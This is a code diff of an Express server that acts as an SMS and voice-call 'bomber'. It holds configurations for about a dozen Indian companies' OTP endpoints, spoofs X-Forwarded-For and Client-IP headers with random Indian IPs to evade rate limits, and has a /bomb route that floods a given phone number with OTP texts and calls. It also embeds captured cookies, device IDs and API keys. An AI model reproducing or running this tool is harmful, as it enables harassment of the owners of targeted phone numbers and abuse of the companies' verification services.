@@ -1,5 +1,5 @@
 // ============================================================
-// api_server.js - OTP API Server with Health Logging (25 APIs)
+// api_server.js - OTP API Server with Health Logging
 // ============================================================
 
 const express = require('express');
@@ -15,11 +15,12 @@ app.use(express.urlencoded({ extended: true }));
 // ===== CONFIG =====
 // ============================================================
 
+const BATCH_SIZE = 20;
 const BATCH_DELAY = 10;
 const API_TIMEOUT = 5000;
 
 // ============================================================
-// ===== IP GENERATOR =====
+// ===== IP GENERATOR (Random Indian IP) =====
 // ============================================================
 
 function randomIndianIP() {
@@ -29,65 +30,90 @@ function randomIndianIP() {
 }
 
 // ============================================================
-// ===== API CONFIGS (25 APIs) =====
+// ===== API CONFIGS =====
 // ============================================================
 
 const API_CONFIGS = [
-    // ==================== SMS APIs ====================
     {
-        name: "Hungama",
+        name: "Hungama Communication",
         endpoint: "https://communication.api.hungama.com/v1/communication/otp",
         method: "POST",
-        type: "sms",
         payload: {
-            "mobileNo": "{{PHONE}}", "countryCode": "+91", "appCode": "un",
-            "messageId": "1", "emailId": "", "subject": "Register",
-            "priority": "1", "device": "web", "variant": "v1", "templateCode": 1
+            "mobileNo": "{{PHONE}}",
+            "countryCode": "+91",
+            "appCode": "un",
+            "messageId": "1",
+            "emailId": "",
+            "subject": "Register",
+            "priority": "1",
+            "device": "web",
+            "variant": "v1",
+            "templateCode": 1
         },
         headers: {
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/json",
-            "identifier": "home", "mlang": "en", "country_code": "IN",
+            "identifier": "home",
+            "mlang": "en",
+            "sec-ch-ua-platform": "\"Android\"",
+            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
+            "sec-ch-ua-mobile": "?1",
+            "alang": "en",
+            "country_code": "IN",
+            "vlang": "en",
             "origin": "https://www.hungama.com",
-            "referer": "https://www.hungama.com/"
-        }
+            "sec-fetch-site": "same-site",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://www.hungama.com/",
+            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+            "priority": "u=1, i"
+        },
+        type: "sms"
     },
     {
-        name: "MeruCab",
+        name: "Meru Cab",
         endpoint: "https://merucabapp.com/api/otp/generate",
         method: "POST",
-        type: "sms",
-        raw: true,
         payload: { "mobile_number": "{{PHONE}}" },
         headers: {
+            "Mobilenumber": "{{PHONE}}",
             "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
-            "AppVersion": "245", "ApiVersion": "6.2.55", "DeviceType": "Android",
+            "Oauthtoken": "",
+            "AppVersion": "245",
+            "ApiVersion": "6.2.55",
+            "DeviceType": "Android",
             "DeviceId": "44098bdebb2dc047",
             "Content-Type": "application/x-www-form-urlencoded",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip",
             "User-Agent": "okhttp/4.9.0"
-        }
+        },
+        type: "sms",
+        raw: true
     },
     {
-        name: "Dayco",
+        name: "Dayco India",
         endpoint: "https://ekyc.daycoindia.com/api/nscript_functions.php",
         method: "POST",
-        type: "sms",
-        raw: true,
         payload: { "api": "send_otp", "brand": "dayco", "mob": "{{PHONE}}", "resend_otp": "resend_otp" },
         headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
             "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
             "Origin": "https://ekyc.daycoindia.com",
-            "Referer": "https://ekyc.daycoindia.com/verify_otp.php"
-        }
+            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
+            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; PHPSESSID=tbt45qc065ng0cotka6aql88sm;"
+        },
+        type: "sms",
+        raw: true
     },
     {
         name: "Doubtnut",
         endpoint: "https://api.doubtnut.com/v4/student/login",
         method: "POST",
-        type: "sms",
         payload: {
             "app_version": "7.10.51",
             "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450",
@@ -99,274 +125,131 @@ const API_CONFIGS = [
             "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9svGS6MlrzZxwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"
         },
         headers: {
-            "version_code": "1160", "has_upi": "false",
-            "device_model": "ASUS_I005DA", "android_sdk_version": "28",
+            "version_code": "1160",
+            "has_upi": "false",
+            "device_model": "ASUS_I005DA",
+            "android_sdk_version": "28",
             "content-type": "application/json; charset=utf-8",
-            "accept-encoding": "gzip", "user-agent": "okhttp/5.0.0-alpha.2"
-        }
+            "accept-encoding": "gzip",
+            "user-agent": "okhttp/5.0.0-alpha.2"
+        },
+        type: "sms"
     },
     {
         name: "NoBroker",
         endpoint: "https://www.nobroker.in/api/v3/account/otp/send",
         method: "POST",
-        type: "sms",
-        raw: true,
         payload: { "phone": "{{PHONE}}", "countryCode": "IN" },
         headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
             "Content-Type": "application/x-www-form-urlencoded",
             "origin": "https://www.nobroker.in",
             "referer": "https://www.nobroker.in/"
-        }
+        },
+        type: "sms",
+        raw: true
     },
     {
         name: "Shiprocket",
         endpoint: "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
         method: "POST",
-        type: "sms",
         payload: { "mobileNumber": "{{PHONE}}" },
         headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
             "Accept": "application/json",
             "Content-Type": "application/json",
             "authorization": "Bearer null",
             "origin": "https://app.shiprocket.in",
             "referer": "https://app.shiprocket.in/"
-        }
+        },
+        type: "sms"
+    },
+    {
+        name: "Tata Capital (Voice)",
+        endpoint: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+        method: "POST",
+        payload: { "phone": "{{PHONE}}", "applSource": "", "isOtpViaCallAtLogin": "true" },
+        headers: { "Content-Type": "application/json" },
+        type: "call"
     },
     {
         name: "PenPencil",
         endpoint: "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
         method: "POST",
-        type: "sms",
         payload: { "organizationId": "5eb393ee95fab7468a79d189", "mobile": "{{PHONE}}" },
         headers: {
             "content-type": "application/json; charset=utf-8",
             "accept-encoding": "gzip",
             "user-agent": "okhttp/3.9.1"
-        }
-    },
-    {
-        name: "KPNFresh",
-        endpoint: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
-        method: "POST",
-        type: "sms",
-        payload: { "phone_number": { "number": "{{PHONE}}", "country_code": "+91" } },
-        headers: {
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-            "content-type": "application/json",
-            "origin": "https://www.kpnfresh.com",
-            "referer": "https://www.kpnfresh.com/"
-        }
-    },
-    {
-        name: "Servetel",
-        endpoint: "https://api.servetel.in/v1/auth/otp",
-        method: "POST",
-        type: "sms",
-        raw: true,
-        payload: { "mobile_number": "{{PHONE}}" },
-        headers: {
-            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
-            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13)"
-        }
-    },
-    {
-        name: "Lenskart",
-        endpoint: "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
-        method: "POST",
-        type: "sms",
-        payload: { "captcha": null, "phoneCode": "+91", "telephone": "{{PHONE}}" },
-        headers: {
-            "Content-Type": "application/json",
-            "X-API-Client": "mobilesite",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13)",
-            "Origin": "https://www.lenskart.com",
-            "Referer": "https://www.lenskart.com/"
-        }
-    },
-    {
-        name: "BikeFixup",
-        endpoint: "https://api.bikefixup.com/api/v2/send-registration-otp",
-        method: "POST",
-        type: "sms",
-        payload: { "phone": "{{PHONE}}", "app_signature": "4pFtQJwcz6y" },
-        headers: {
-            "content-type": "application/json; charset=UTF-8",
-            "user-agent": "Dart/3.6 (dart:io)"
-        }
-    },
-    {
-        name: "Stratzy",
-        endpoint: "https://stratzy.in/api/web/auth/sendPhoneOTP",
-        method: "POST",
-        type: "sms",
-        payload: { "phoneNo": "{{PHONE}}" },
-        headers: {
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-            "content-type": "application/json",
-            "origin": "https://stratzy.in",
-            "referer": "https://stratzy.in/login"
-        }
-    },
-    {
-        name: "WellAcademy",
-        endpoint: "https://wellacademy.in/store/api/numberLoginV2",
-        method: "POST",
-        type: "sms",
-        payload: { "contact_no": "{{PHONE}}" },
-        headers: {
-            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-            "content-type": "application/json; charset=UTF-8",
-            "origin": "https://wellacademy.in"
-        }
-    },
-    {
-        name: "BeepKart",
-        endpoint: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
-        method: "POST",
-        type: "sms",
-        payload: { "city": 362, "fullName": "", "phone": "{{PHONE}}", "source": "myaccount" },
-        headers: {
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-            "origin": "https://www.beepkart.com",
-            "referer": "https://www.beepkart.com/"
-        }
-    },
-    {
-        name: "LendingPlate",
-        endpoint: "https://lendingplate.com/api.php",
-        method: "POST",
-        type: "sms",
-        raw: true,
-        payload: { "mobiles": "{{PHONE}}", "resend": "Resend", "clickcount": "3" },
-        headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Origin": "https://lendingplate.com",
-            "Referer": "https://lendingplate.com/personal-loan"
-        }
-    },
-    {
-        name: "Snitch",
-        endpoint: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
-        method: "POST",
-        type: "sms",
-        payload: { "mobile_number": "+91{{PHONE}}" },
-        headers: {
-            "Content-Type": "application/json",
-            "client-id": "snitch_secret",
-            "Origin": "https://www.snitch.com",
-            "Referer": "https://www.snitch.com/"
-        }
-    },
-    {
-        name: "Foxy",
-        endpoint: "https://www.foxy.in/api/v2/users/send_otp",
-        method: "POST",
-        type: "sms",
-        payload: { "user": { "phone_number": "+91{{PHONE}}" }, "device": null },
-        headers: {
-            "Content-Type": "application/json",
-            "Platform": "web",
-            "Origin": "https://www.foxy.in",
-            "Referer": "https://www.foxy.in/onboarding",
-            "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
-        }
-    },
-    {
-        name: "Wakefit",
-        endpoint: "https://api.wakefit.co/api/consumer-sms-otp/",
-        method: "POST",
-        type: "sms",
-        payload: { "mobile": "{{PHONE}}", "whatsapp_opt_in": 1 },
-        headers: {
-            "Content-Type": "application/json",
-            "Origin": "https://www.wakefit.co",
-            "Referer": "https://www.wakefit.co/",
-            "API-Secret-Key": "ycq55IbIjkLb",
-            "API-Token": "c84d563b77441d784dce71323f69eb42",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
-        }
-    },
-    {
-        name: "Univest",
-        method: "GET",
-        type: "sms",
-        urlBuilder: (phone) => `https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=${phone}`,
-        headers: { "User-Agent": "okhttp/3.9.1" }
-    },
-    {
-        name: "Jockey",
-        method: "GET",
-        type: "sms",
-        urlBuilder: (phone) => `https://www.jockey.in/apps/jotp/api/login/send-otp/+91${phone}?whatsapp=false`,
-        headers: {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
-            "Accept": "*/*",
-            "Referer": "https://www.jockey.in/"
-        }
-    },
-    {
-        name: "EkaCare",
-        endpoint: "https://auth.eka.care/auth/init",
-        method: "POST",
-        type: "sms",
-        payload: { "payload": { "allowWhatsapp": true, "mobile": "+91{{PHONE}}" }, "type": "mobile" },
-        headers: {
-            "Device-Id": "5df83c463f0ff8ff",
-            "Flavour": "android",
-            "Client-Id": "androidp",
-            "Content-Type": "application/json; charset=UTF-8",
-            "User-Agent": "okhttp/4.9.3"
-        }
-    },
-    {
-        name: "Smytten",
-        endpoint: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
-        method: "POST",
-        type: "sms",
-        payload: { "device_platform": "web", "phone": "{{PHONE}}" },
-        headers: {
-            "Content-Type": "application/json",
-            "Origin": "https://smytten.com",
-            "Referer": "https://smytten.com/",
-            "User-Agent": "Mozilla/5.0 (Linux; Android 13)"
-        }
-    },
-
-    // ==================== VOICE CALL APIs ====================
-    {
-        name: "TataCapital (Voice)",
-        endpoint: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
-        method: "POST",
-        type: "call",
-        payload: { "phone": "{{PHONE}}", "applSource": "", "isOtpViaCallAtLogin": "true" },
-        headers: { "Content-Type": "application/json" }
+        },
+        type: "sms"
     },
     {
         name: "1MG (Voice)",
         endpoint: "https://www.1mg.com/auth_api/v6/create_token",
         method: "POST",
-        type: "call",
         payload: { "number": "{{PHONE}}", "is_corporate_user": false, "otp_on_call": true },
         headers: {
             "content-type": "application/json; charset=utf-8",
+            "accept-encoding": "gzip",
             "user-agent": "okhttp/3.9.1"
-        }
+        },
+        type: "call"
     },
     {
         name: "Swiggy (Voice)",
         endpoint: "https://profile.swiggy.com/api/v3/app/request_call_verification",
         method: "POST",
-        type: "call",
         payload: { "mobile": "{{PHONE}}" },
         headers: {
             "user-agent": "Swiggy-Android",
-            "content-type": "application/json; charset=utf-8"
-        }
+            "accept-encoding": "gzip",
+            "accept": "application/json; charset=utf-8",
+            "content-type": "application/json; charset=utf-8",
+            "pl-version": "55",
+            "version-code": "1161",
+            "app-version": "4.38.1",
+            "latitude": "0.0",
+            "longitude": "0.0",
+            "os-version": "13",
+            "accessibility_enabled": "false",
+            "swuid": "4c27ae3a76b146f3",
+            "deviceid": "4c27ae3a76b146f3",
+            "x-network-quality": "GOOD"
+        },
+        type: "call"
+    },
+    {
+        name: "KPN Fresh",
+        endpoint: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
+        method: "POST",
+        payload: { "phone_number": { "number": "{{PHONE}}", "country_code": "+91" } },
+        headers: {
+            "cache": "no-store",
+            "x-channel-id": "WEB",
+            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
+            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+            "content-type": "application/json",
+            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
+            "accept": "*/*",
+            "origin": "https://www.kpnfresh.com",
+            "referer": "https://www.kpnfresh.com/"
+        },
+        type: "sms"
+    },
+    {
+        name: "Servetel",
+        endpoint: "https://api.servetel.in/v1/auth/otp",
+        method: "POST",
+        payload: { "mobile_number": "{{PHONE}}" },
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
+            "Connection": "Keep-Alive",
+            "Accept-Encoding": "gzip"
+        },
+        type: "sms",
+        raw: true
     }
 ];
 
@@ -376,7 +259,7 @@ const API_CONFIGS = [
 
 const stats = {};
 const recentLogs = [];
-const MAX_LOGS = 300;
+const MAX_LOGS = 200;
 
 API_CONFIGS.forEach(api => {
     stats[api.name] = {
@@ -396,16 +279,27 @@ API_CONFIGS.forEach(api => {
 function logEvent(msg, type = 'info') {
     const emoji = { info: 'ℹ️', success: '✅', error: '❌', warn: '⚠️' }[type] || 'ℹ️';
     console.log(`${emoji} [${new Date().toISOString().slice(11, 19)}] ${msg}`);
-    recentLogs.push({ time: new Date().toISOString(), type, msg });
+
+    recentLogs.push({
+        time: new Date().toISOString(),
+        type,
+        msg
+    });
     if (recentLogs.length > MAX_LOGS) recentLogs.shift();
 }
 
 function recordResult(apiName, success, statusCode, responseTime, error = null) {
     const s = stats[apiName];
     if (!s) return;
+
     s.total++;
-    if (success) { s.success++; s.lastStatus = 'WORKING'; }
-    else { s.failed++; s.lastStatus = 'FAILED'; }
+    if (success) {
+        s.success++;
+        s.lastStatus = 'WORKING';
+    } else {
+        s.failed++;
+        s.lastStatus = 'FAILED';
+    }
     s.lastStatusCode = statusCode;
     s.lastTime = new Date().toISOString();
     s.lastError = error;
@@ -415,15 +309,21 @@ function recordResult(apiName, success, statusCode, responseTime, error = null) 
 }
 
 // ============================================================
-// ===== HELPERS =====
+// ===== PAYLOAD BUILDER =====
 // ============================================================
 
 function replacePlaceholders(obj, phone) {
-    if (typeof obj === 'string') return obj.replace(/\{\{PHONE\}\}/g, phone);
-    if (Array.isArray(obj)) return obj.map(item => replacePlaceholders(item, phone));
+    if (typeof obj === 'string') {
+        return obj.replace(/\{\{PHONE\}\}/g, phone);
+    }
+    if (Array.isArray(obj)) {
+        return obj.map(item => replacePlaceholders(item, phone));
+    }
     if (typeof obj === 'object' && obj !== null) {
         const out = {};
-        for (const key in obj) out[key] = replacePlaceholders(obj[key], phone);
+        for (const key in obj) {
+            out[key] = replacePlaceholders(obj[key], phone);
+        }
         return out;
     }
     return obj;
@@ -448,26 +348,22 @@ async function callAPI(api, phone) {
     const ip = randomIndianIP();
 
     try {
-        // Build URL (dynamic or static)
-        const url = api.urlBuilder ? api.urlBuilder(phone) : api.endpoint;
-
         // Build headers
-        const headers = { ...(api.headers || {}) };
+        const headers = { ...api.headers };
         for (const key in headers) {
             if (typeof headers[key] === 'string') {
                 headers[key] = headers[key].replace(/\{\{PHONE\}\}/g, phone);
             }
         }
+        // Add spoofed IP
         headers['X-Forwarded-For'] = ip;
         headers['Client-IP'] = ip;
 
         // Build payload
         let data;
-        const contentType = (headers['Content-Type'] || headers['content-type'] || '').toLowerCase();
+        const contentType = headers['Content-Type'] || headers['content-type'] || '';
 
-        if (api.method === 'GET') {
-            data = undefined;
-        } else if (api.raw || contentType.includes('x-www-form-urlencoded')) {
+        if (api.raw || contentType.includes('x-www-form-urlencoded')) {
             const replaced = replacePlaceholders(api.payload, phone);
             data = buildFormData(replaced);
         } else {
@@ -476,20 +372,28 @@ async function callAPI(api, phone) {
 
         const config = {
             method: api.method,
-            url,
-            headers,
+            url: api.endpoint,
+            headers: headers,
             timeout: API_TIMEOUT,
-            validateStatus: () => true
+            validateStatus: () => true // Don't throw on HTTP errors
         };
-        if (data !== undefined) config.data = data;
+
+        if (api.method === 'POST') {
+            config.data = data;
+        }
 
         const response = await axios(config);
         const responseTime = Date.now() - startTime;
+
+        // Consider 2xx and 4xx as "API is alive" (server responded)
+        // 5xx = API down
+        // Network errors = down
         const isAlive = response.status < 500;
+        const isSuccess = response.status >= 200 && response.status < 300;
 
         if (isAlive) {
             recordResult(api.name, true, response.status, responseTime);
-            if (response.status >= 200 && response.status < 300) {
+            if (isSuccess) {
                 logEvent(`${api.name} → ${response.status} (${responseTime}ms) ✅`, 'success');
             } else {
                 logEvent(`${api.name} → ${response.status} (${responseTime}ms) [alive]`, 'warn');
@@ -513,6 +417,7 @@ async function callAPI(api, phone) {
 // ===== ROUTES =====
 // ============================================================
 
+// Root - server status
 app.get('/', (req, res) => {
     res.json({
         status: 'ok',
@@ -522,11 +427,16 @@ app.get('/', (req, res) => {
     });
 });
 
+// Health check
 app.get('/health', (req, res) => {
-    res.json({ status: 'ok', uptime: process.uptime(), apis: API_CONFIGS.length });
+    res.json({
+        status: 'ok',
+        uptime: process.uptime(),
+        apis: API_CONFIGS.length
+    });
 });
 
-// Test ALL APIs
+// Test all APIs with a single number (for checking which work)
 app.get('/test', async (req, res) => {
     const phone = req.query.phone || '9999999999';
     logEvent(`🧪 Testing all APIs with ${phone}...`, 'info');
@@ -534,23 +444,39 @@ app.get('/test', async (req, res) => {
     const results = [];
     for (const api of API_CONFIGS) {
         const r = await callAPI(api, phone);
-        results.push({ name: api.name, type: api.type, ...r });
-        await new Promise(r => setTimeout(r, 300));
+        results.push({
+            name: api.name,
+            type: api.type,
+            endpoint: api.endpoint,
+            ...r
+        });
+        await new Promise(r => setTimeout(r, 300)); // small gap
     }
 
     const working = results.filter(r => r.success).length;
     const failed = results.length - working;
-    logEvent(`🧪 Test complete: ${working}/${results.length} working`, working > 0 ? 'success' : 'error');
 
-    res.json({ phone, total: results.length, working, failed, results });
+    logEvent(`🧪 Test complete: ${working} working, ${failed} failed`, working > 0 ? 'success' : 'error');
+
+    res.json({
+        phone,
+        total: results.length,
+        working,
+        failed,
+        results
+    });
 });
 
-// Test single API
+// Test a single API
 app.get('/test-one', async (req, res) => {
     const apiName = req.query.name;
     const phone = req.query.phone || '9999999999';
+
     const api = API_CONFIGS.find(a => a.name.toLowerCase() === (apiName || '').toLowerCase());
-    if (!api) return res.status(404).json({ error: 'API not found. Use /apis to list.' });
+    if (!api) {
+        return res.status(404).json({ error: 'API not found. Use /apis to list.' });
+    }
+
     const r = await callAPI(api, phone);
     res.json({ name: api.name, ...r });
 });
@@ -562,13 +488,13 @@ app.get('/apis', (req, res) => {
         apis: API_CONFIGS.map(a => ({
             name: a.name,
             type: a.type,
-            method: a.method,
-            endpoint: a.endpoint || '(dynamic)'
+            endpoint: a.endpoint,
+            method: a.method
         }))
     });
 });
 
-// Stats
+// Stats - which APIs are working
 app.get('/stats', (req, res) => {
     const arr = Object.values(stats).map(s => ({
         name: s.name,
@@ -589,22 +515,38 @@ app.get('/stats', (req, res) => {
     const untestedCount = arr.filter(a => a.status === 'NEVER TESTED').length;
 
     res.json({
-        summary: { total: arr.length, working: workingCount, failed: failedCount, untested: untestedCount },
+        summary: {
+            total: arr.length,
+            working: workingCount,
+            failed: failedCount,
+            untested: untestedCount
+        },
         apis: arr
     });
 });
 
+// Recent logs
 app.get('/logs', (req, res) => {
-    res.json({ count: recentLogs.length, logs: recentLogs.slice(-50).reverse() });
+    res.json({
+        count: recentLogs.length,
+        logs: recentLogs.slice(-50).reverse()
+    });
 });
 
+// Reset stats
 app.get('/reset-stats', (req, res) => {
     for (const key in stats) {
         stats[key] = {
-            name: stats[key].name, type: stats[key].type,
-            total: 0, success: 0, failed: 0,
-            lastStatus: null, lastStatusCode: null,
-            lastTime: null, lastError: null, avgResponseTime: 0
+            name: stats[key].name,
+            type: stats[key].type,
+            total: 0,
+            success: 0,
+            failed: 0,
+            lastStatus: null,
+            lastStatusCode: null,
+            lastTime: null,
+            lastError: null,
+            avgResponseTime: 0
         };
     }
     recentLogs.length = 0;
@@ -612,17 +554,20 @@ app.get('/reset-stats', (req, res) => {
     res.json({ success: true, message: 'Stats reset' });
 });
 
-// Bomb endpoint
+// Bomb endpoint (for bot.js)
 app.post('/bomb', async (req, res) => {
     const { phone, duration, instance } = req.body;
+
     if (!phone || phone.length !== 10) {
         return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
     }
 
-    logEvent(`📱 BOMB | phone=${phone} | duration=${duration || 'default'} | instance=${instance || 'default'}`, 'info');
+    logEvent(`📱 BOMB REQUEST | phone=${phone} | duration=${duration || 'default'} | instance=${instance || 'default'}`, 'info');
 
     try {
         const startTime = Date.now();
+
+        // Shuffle APIs
         const shuffled = [...API_CONFIGS];
         for (let i = shuffled.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
@@ -644,13 +589,19 @@ app.post('/bomb', async (req, res) => {
         }
 
         const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-        logEvent(`📱 DONE | ${phone} | sent=${success} | sms=${smsCount} | calls=${callCount} | ${elapsed}s`, success > 0 ? 'success' : 'error');
+        logEvent(`📱 BOMB DONE | ${phone} | sent=${success} | sms=${smsCount} | calls=${callCount} | ${elapsed}s`, success > 0 ? 'success' : 'error');
 
         res.json({
-            success: true, phone, duration: duration || 'default',
+            success: true,
+            phone,
+            duration: duration || 'default',
             instance: instance || 'default',
-            totalSent: success, sms: smsCount, calls: callCount, whatsapp: 0,
-            elapsed: elapsed + 's', details: results
+            totalSent: success,
+            sms: smsCount,
+            calls: callCount,
+            whatsapp: 0,
+            elapsed: elapsed + 's',
+            details: results
         });
     } catch (error) {
         logEvent(`📱 BOMB ERROR | ${phone} | ${error.message}`, 'error');
@@ -674,11 +625,11 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log('   GET  /              - Server status');
     console.log('   GET  /health        - Health check');
     console.log('   GET  /apis          - List all APIs');
-    console.log('   GET  /test?phone=X  - Test ALL APIs');
-    console.log('   GET  /test-one?name=X&phone=Y - Test single');
-    console.log('   GET  /stats         - Working/Failed summary');
-    console.log('   GET  /logs          - Recent logs');
-    console.log('   GET  /reset-stats   - Reset stats');
+    console.log('   GET  /test?phone=X  - Test ALL APIs with a number');
+    console.log('   GET  /test-one?name=X&phone=Y - Test single API');
+    console.log('   GET  /stats         - Show working/failed APIs');
+    console.log('   GET  /logs          - Recent activity logs');
+    console.log('   GET  /reset-stats   - Clear stats');
     console.log('   POST /bomb          - Trigger bombing');
     console.log('═══════════════════════════════════════════');
     API_CONFIGS.forEach((api, i) => {
